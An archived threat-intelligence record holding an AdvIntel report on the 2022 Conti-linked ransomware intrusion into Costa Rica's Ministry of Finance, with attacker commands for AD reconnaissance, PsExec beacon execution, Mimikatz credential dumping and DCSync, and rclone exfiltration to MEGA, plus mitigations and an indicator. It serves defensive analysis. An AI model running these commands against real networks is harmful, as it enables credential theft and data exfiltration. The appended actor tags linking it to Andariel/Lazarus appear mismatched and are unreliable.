{
    "id": "64d1725f-8cfa-4845-b2d6-0a4ee7d5c35b",
    "created_at": "2023-01-12T15:08:17.895328Z",
    "updated_at": "2025-03-27T02:16:26.414123Z",
    "deleted_at": null,
    "sha1_hash": "8f244f0c19cb41c2a0d793027ee8e64f0a859e49",
    "title": "2022-07-20 - Anatomy of Attack- Truth Behind the Costa Rica Government Ransomware 5-Day Intrusion",
    "authors": "",
    "file_creation_date": "2022-08-18T03:27:31Z",
    "file_modification_date": "2022-08-18T03:27:31Z",
    "file_size": 1252678,
    "plain_text": "# Anatomy of Attack: Truth Behind the Costa Rica Government Ransomware 5-Day Intrusion\n\n**[advintel.io/post/anatomy-of-attack-truth-behind-the-costa-rica-government-ransomware-5-day-intrusion](https://www.advintel.io/post/anatomy-of-attack-truth-behind-the-costa-rica-government-ransomware-5-day-intrusion)**\n\nAdvIntel July 19, 2022\n\nJul 19\n\n5 min read\n\n_By Vitali Kremez, Yelisey Boguslavskiy, Marley Smith_\n\n\n-----\n\nThis report data is derived from Andariel s adversarial collections, which enable visibility\ninto Cobalt Strike commands which bypass a known EDR solution in a play-by-play format.\nThe ransomware and exfiltration operation took approximately five days from the initial\naccess on April 11, 2022 primarily due to the massive data exfiltration prolonging the\nexploitation operation prior to the ransomware deployment.\n\n_On May 8, 2022, the new president of Costa Rica, Rodrigo Chaves Robles, decreed a state_\n_of national emergency due to cyber attacks, naming them as an act of terrorism. Days later,_\n_at a press conference, he stated that the country was in a state of war, and that there was_\n_evidence that people were helping Conti from within Costa Rica, whom he called \"traitors\"_\n_and \"filibusters\"._\n\n_Screenshot from the now-defunct Conti blog offering to “chat” with President Chavez—an_\n_offer for ransom negotiations to begin._\n\n**Early Warning: Key Events & Background**\n\nAdvIntel’s Andariel platform spotted the attack preparations by the now-defunct Conti as\nearly as April 11, 2022, during the preliminary stage in which the threat actor was reviewing\nand doing reconnaissance on their chosen target.\n\nIn its April 15 daily Breach Pulse report, AdvIntel detailed a confirmed Conti operation\nagainst Costa Rica’s **[Ministerio de Hacienda (Ministry of Finance) as their initial access](https://www.hacienda.go.cr/)**\n**point.**\n\n**Adversarial Insights**\n\n\n-----\n\n**This attack on the Costa Rican Ministry of Finance was ultimately part of a much**\n**larger attack by the group now known as** **_Quantum_** **against the Costa Rican**\n**government.**\n\nThese attacks were done in the name of Conti only as part of their long-term dissolution\nplan for the syndicate, a plot that has been detailed extensively by AdvIntel’s intelligence\nteam.\n\nFollowing the April 11, 2022 infection, the threat actors responsible began further developing\ntheir attacks on Costa Rica, leaving systems down across the country. Functionality for some\nagencies, such as the Ministry of Finance, were down through the beginning of June.\n\n**Anatomy of an Attack: From Initial Access to Ransomware Deployment**\n\n\n-----\n\n_AdvIntel infographic depicting a simplified version of the attack flow._\n\n**The initial attack vector for this operation was compromised credential access via**\n**_VPN._**\n\n\n-----\n\n**Name: Ministerio de Hacienda Costa Rica**\n\n**Domain: hacienda.go.cr**\n\n**Threat Actor Name: MemberX**\n\n**Date(s): April 11, 2022**\n\n**Timeline of Exploitation Operation: April 11, 2022 to April 15, 2022**\n\n_Infographic depicting attack flow, via AdvIntel._\n\nOne of the most damaging network intrusions typical in the threat landscape as of late\nincludes the above attack flow, which was established and documented by the AdvIntel\nteam. More than ten Cobalt Strike beacon sessions were established and documented as\npart of this attack.\n\n**1. The infection followed a typical attack flow wherein the adversaries gained access from**\nthe compromised VPN log by installing a crypted form of Cobalt Strike inside the Costa\nRica sub-network.\n\n**2. The adversaries obtained local network domain administrator and enterprise**\n**administrator recon via the following commands:**\n\n\n-----\n\n```\nnltest /dclist:\n\nnet group \"domain Admins\" /domain\n\nnet group \"Enterprise Admins\" /domain\n\n```\n**3. The threat actors then performed network reconnaissance via Nltest domain trust**\n**enumeration, before scanning the network for file shares by leveraging the ShareFinder**\nutility and AdFind from C:\\ProgramData. This took the form of the following:\n```\nInvoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii\nC:\\ProgramData\\found_shares.txt\n\nadfind.exe -f \"(objectcategory=person)\" > ad_users.txt\n\nadfind.exe -f \"objectcategory=computer\" > ad_computers.txt\n\nadfind.exe -f \"(objectcategory=organizationalUnit)\" > ad_ous.txt\n\nadfind.exe -sc trustdmp > trustdmp.txt\n\nadfind.exe -subnets -f (objectCategory=subnet)> subnets.txt\n\nadfind.exe -f \"(objectcategory=group)\" > ad_group.txt\n\nadfind.exe -gcb -sc trustdmp > trustdmp.txt\n\n```\n**4. The adversary (referenced by internal pseudonym \"MemberX\") downloaded the**\n**fileshare output on their local machine via the Cobalt Strike channel.**\n\nThis attack pattern provided an opportunity for the attackers to access ADMIN$ file shares\nand upload/run a Cobalt Strike DLL beacon binary from the remote location via PsExec,\nthereby establishing local administrator access via the following command:\n```\npsexec 10.X.X.XX cmd.exe /c regsvr32.exe C:\\ProgramData\\1.dll\n\n```\n**5. Then, the adversaries leveraged Cobalt Strike’s Mimikatz to dump logon passwords**\n**and NTDS hashes of the local machine users, obtaining plaintext and bruteable local**\n**admin, domain and enterprise administrator hashes.**\n```\nmimikatz sekurlsa::logonpasswords\n\n```\n**6. The adversaries leveraged the enterprise user credentials to perform a DCSync and**\n**Zerologon attack. This effectively gained them access to every host on the Costa Rica**\n**interconnected networks.**\n\n\n-----\n\n```\nmimikatz @lsadump::dcsync /domain:HACIENDA /all /csv\n\n```\n**7. The adversaries then uploaded MSI scripts with Atera Remote Management Tool**\n(RMM), the remote hosts selecting those with local admin access and less user activity. This\nestablished \"anchoring\" and safe return in case the threat actors’ beacons were burned or\ndetected by the well-known EDR tool utilized by Costa Rica.\n\n**8. The adversaries pinged the whole network and re-scanned the network domain trusts,**\nleveraging enterprise administrator credentials with ShareFinder and compiling a list of all\n**corporate assets and databases available under their new elevated privileges.**\n\n**9. On several network hosts, the adversaries also created a Rclone configuration file, which**\ntheir data exfiltration tool leveraged as input with the MEGA Share uploader. They then\n**began exfiltration from the network.**\n```\nrclone.exe copy \"\\\\REDACTED.mh.hacienda.go.cr\\REDACTED\" mega:REDACTED -q --ignoreexisting --auto-confirm --multi-thread-streams 6 --transfers 6\n\n```\n**10. The adversaries uploaded Process Hacker, Power Tools, and Do Not Sleep tools, and**\nbatch scripts filled in with the fileshare access locations, passing the drive parameter:\n```\nstart regsvr32.exe /s /n /i:\"-m -net -size 10 -nomutex -p \\\\REDACTED.local\\D$\"\nx64.dll\n\n\n\n```\nBy and large, this intrusion was relatively unsophisticated, reliant on bypassing the EDR\n**solution via the custom in-memory beacon. This, along with a rather \"flat\" network with**\nmisconfigured administrative shares, allowed for the deployment of a ransomware operation\nacross the related domain trusts.\n\n**Perspective & Outlook**\n\nGiven that the Costa Rican attacks were done partially as a form of symbolic closure for\n**the Conti syndicate, this decision to stick with the toolkit that the group was renowned for**\nfeels intentional on the part of the threat actors—the anatomy of these hacks, as seen with\nthe Ministry of Finance, was unmistakably in Conti’s signature attack style.\n\n\n-----\n\nThe notability and recognizability in Conti’s attack style also ultimately contributed to the\ngroup’s downfall, however. As Conti honed their attack methodology to a high degree of\nproficiency, defense and security agencies began to catch on to distinctive Conti method of\noperations, and develop mitigations for them. This is a contributing factor to the rise of more\nadaptive and personalized tactics being utilized by Conti’s successors, such as social\n**engineering and complex phishing schemes.**\n\n**Mitigations & Recommendations [Cobalt Strike Ransomware Operations]**\n\nTo successfully disrupt Cobalt Strike ransomware operations, AdvIntel recommends the\n_following countermeasures:_\n\nTo identify Cobalt Strike, examine the network traffic using TLS inspection, then\nisolate bot traffic and identify the suspicious traffic by examining data within HTTPS\nrequests.\n\nAndariel enables direct beacon IOC tracking via our Cobalt Strike index. Any\nexecuted commands can also be tracked via this index.\n\nImplement a recovery plan to maintain and retain multiple copies of sensitive or\n**proprietary data and servers in a physically separate, segmented, and secure location**\n(i.e., hard drive, storage device, the cloud).\n\nImplement network segmentation and maintain offline data backups to ensure limited\ninterruption to the organization.\n\n**Regularly back up data, and password-protect backup copies offline. Ensure**\ncopies of critical data are not accessible for modification or deletion from the system\nwhere the data resides.\n\nSpecial emphasis should be placed on network investigation tools typical for\nexfiltration-centric groups. These tools include Cobalt Strike sessions opened,\nMetasploit, and, most importantly, customized PowerShell commands.\n\n**Prevent admin accounts from being enumerated when an application is elevating**\n**through UAC due to the risk of account names being discovered and potentially**\nleading to further infection.\n\n\n-----\n\nRclone is the main data exfiltration command-line interface. Rclone activity can be\ncaptured through proper logging of process execution with command-line\narguments.\n\nPrioritize educating and training employees on basic cybersecurity hygiene rules\nsuch as creating strong passwords, as well as how to avoid common scams.\n\n**Indicator of Compromise (IOC):**\n\nThe Cobalt Strike Command-and-Control involved in the Costa Rica intrusion:\n\n**borizhog[.]com**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-20 - Anatomy of Attack- Truth Behind the Costa Rica Government Ransomware 5-Day Intrusion.pdf"
    ],
    "report_names": [
        "2022-07-20 - Anatomy of Attack- Truth Behind the Costa Rica Government Ransomware 5-Day Intrusion.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536097,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1660793251,
    "ts_modification_date": 1660793251,
    "files": {
        "pdf": "https://archive.orkl.eu/8f244f0c19cb41c2a0d793027ee8e64f0a859e49.pdf",
        "text": "https://archive.orkl.eu/8f244f0c19cb41c2a0d793027ee8e64f0a859e49.txt",
        "img": "https://archive.orkl.eu/8f244f0c19cb41c2a0d793027ee8e64f0a859e49.jpg"
    }
}